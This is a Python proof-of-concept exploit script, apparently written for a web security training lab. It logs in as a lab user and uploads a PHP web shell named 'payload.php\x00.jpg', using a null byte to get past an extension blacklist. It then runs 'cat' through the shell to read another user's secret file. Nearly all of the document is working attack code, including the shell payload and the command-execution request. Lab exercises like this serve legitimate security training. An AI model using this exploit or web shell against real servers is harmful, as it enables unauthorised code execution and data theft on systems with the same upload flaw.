"""
Lab: Web shell upload via obfuscated file extension
Technique: Null Byte Injection (%00) to bypass extension blacklist

How it works:
  - Server validates filename: 'payload.php%00.jpg' -> sees .jpg -> ALLOWED
  - C runtime saves file:       'payload.php'        -> null byte terminates string
  - Result: PHP file saved on disk despite blacklist

Usage: python POC.py <url>
"""

import requests
import sys
import urllib3
from bs4 import BeautifulSoup as bs
import random, string
from requests_toolbelt import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, proxies=proxies, verify=False)
    soup = bs(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def exploit_file_upload(s, url):
    # Step 1: Login
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    data_login = {"csrf": csrf_token, "username": "wiener", "password": "peter"}
    r = s.post(login_url, data=data_login, proxies=proxies, verify=False)

    if "Log out" in r.text:
        print("[+] Login successful as wiener...")

        # Step 2: Upload web shell with null byte obfuscated filename
        # 'payload.php\x00.jpg' -> validator sees .jpg, C runtime saves as payload.php
        print("[+] Uploading web shell via null byte injection...")
        my_acc_url = url + "/my-account"
        csrf = get_csrf_token(s, my_acc_url)
        avatar_url = url + "/my-account/avatar"

        boundary = '----WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))

        param = {
            "avatar": (
                'payload.php\x00.jpg',              # null byte: C truncates to payload.php
                "<?php passthru($_GET['cmd']); ?>",
                'application/octet-stream'
            ),
            'user': 'wiener',
            'csrf': csrf
        }

        m = MultipartEncoder(fields=param, boundary=boundary)
        headers = {'Content-Type': m.content_type}

        r = s.post(avatar_url, data=m, headers=headers, proxies=proxies, verify=False)

        if r.status_code == 200:
            print("[+] Upload response received (check if successful)...")
        else:
            print(f"[-] Upload returned status: {r.status_code}")

        # Step 3: Execute web shell and read secret
        print("[+] Reading secret file...")
        cmd_url = url + '/files/avatars/payload.php?cmd=cat+/home/carlos/secret'
        r = s.get(cmd_url, proxies=proxies, verify=False)

        if r.status_code == 200:
            print("[+] Your secret key is:")
            print(r.text)
        else:
            print(f"[-] Shell not reachable — status: {r.status_code}")
            print("[!] Tip: Null byte may not be supported on this server version (patched in PHP 5.4+)")

    else:
        print("[-] Login failed...")
        sys.exit(1)

def main():
    if len(sys.argv) != 2:
        sys.stderr.write("\n Usage: " + sys.argv[0] + " <url>\n\n")
        sys.exit(1)

    s = requests.Session()
    url = sys.argv[1]
    exploit_file_upload(s, url)

if __name__ == "__main__":
    main()
